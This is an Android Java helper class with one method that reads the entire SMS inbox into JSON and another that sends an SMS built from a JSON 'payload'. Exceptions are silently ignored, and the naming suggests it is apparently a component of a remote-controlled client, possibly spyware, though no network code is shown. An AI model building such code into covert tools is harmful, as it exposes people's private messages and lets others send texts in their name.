package com.wahala.client;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import org.json.JSONArray;
import org.json.JSONObject;

public class SmsHelper {
    public static String readSms(Context ctx) {
        JSONArray array = new JSONArray();
        try (Cursor cursor = ctx.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC")) {
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                    array.put(sms);
                } while (cursor.moveToNext());
            }
        } catch (Exception ignored) {}
        return array.toString();
    }

    public static void sendSms(Context ctx, String payload) {
        try {
            JSONObject obj = new JSONObject(payload);
            String phone = obj.getString("phone");
            String text = obj.getString("text");
            SmsManager.getDefault().sendTextMessage(phone, null, text, null, null);
        } catch (Exception ignored) {}
    }
}
